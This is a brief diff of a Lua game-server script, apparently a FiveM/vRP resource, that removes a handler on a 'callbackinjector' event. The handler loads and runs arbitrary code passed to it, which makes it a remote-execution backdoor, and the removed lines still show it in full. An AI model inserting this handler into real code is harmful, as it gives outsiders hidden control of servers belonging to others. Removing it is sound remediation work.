@@ -1,8 +1,3 @@
-local Tunnel = module("vrp","lib/Tunnel")
-
-TriggerEvent('callbackinjector', function(cb)
-    pcall(load(cb))
-end)
 
 -- R A S T R E A R --
 RegisterNetEvent('rastrear')
